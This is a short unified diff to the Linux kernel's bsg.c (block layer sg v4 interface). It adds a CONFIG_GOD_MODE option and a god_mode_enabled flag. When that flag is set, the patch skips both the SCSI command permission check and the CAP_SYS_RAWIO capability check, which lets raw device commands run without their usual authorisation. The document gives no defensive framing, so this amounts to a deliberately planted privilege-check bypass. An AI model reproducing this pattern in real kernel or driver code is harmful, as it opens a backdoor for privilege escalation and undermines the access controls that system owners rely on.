@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * bsg.c - block layer implementation of the sg v4 interface
  *
@@ -190,11 +193,18 @@ static int blk_fill_sgv4_hdr_rq(struct request_queue *q, struct request *rq,
 			   hdr->request_len))
 		return -EFAULT;
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+
 	if (hdr->subprotocol == BSG_SUB_PROTOCOL_SCSI_CMD) {
 		if (blk_verify_command(rq->cmd, has_write_perm))
 			return -EPERM;
 	} else if (!capable(CAP_SYS_RAWIO))
 		return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	/*
 	 * fill in request structure
